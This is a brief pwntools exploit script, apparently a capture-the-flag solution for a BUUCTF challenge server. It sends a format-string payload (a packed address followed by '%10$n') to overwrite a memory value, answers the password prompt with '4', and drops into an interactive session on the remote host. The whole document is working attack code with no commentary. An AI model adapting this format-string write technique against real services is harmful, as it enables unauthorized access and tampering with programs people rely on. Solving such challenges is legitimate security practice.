from pwn import *

payload = p32(0x0804C044)+b'%10$n'
print(payload)
sh = remote('node5.buuoj.cn', 29019)

sh.recvuntil(b'your name:')
sh.sendline(payload)
sh.recvuntil(b'your passwd:')
sh.sendline('4')
sh.interactive()